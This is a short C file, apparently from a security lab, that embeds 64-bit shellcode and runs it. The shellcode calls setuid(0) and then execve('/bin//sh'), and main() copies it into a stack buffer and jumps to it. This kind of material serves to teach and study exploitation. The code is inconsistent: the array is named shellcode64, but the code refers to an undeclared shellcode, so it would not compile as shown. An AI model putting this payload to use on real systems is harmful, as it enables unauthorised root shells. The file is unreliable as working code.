/* call_shellcode.c: You can get it from the lab's website */
/* Launch a shell using shellcode */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

const char shellcode64[] = \
  "\x48\x31\xc0\x48\x31\xff\xb0\x69\x0f\x05"
  "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
  "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
  "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
;

int main(int argc, char **argv)
{
   char buf[sizeof(shellcode)];
   strcpy(buf, shellcode);
   ((void(*)( ))buf)( );
}

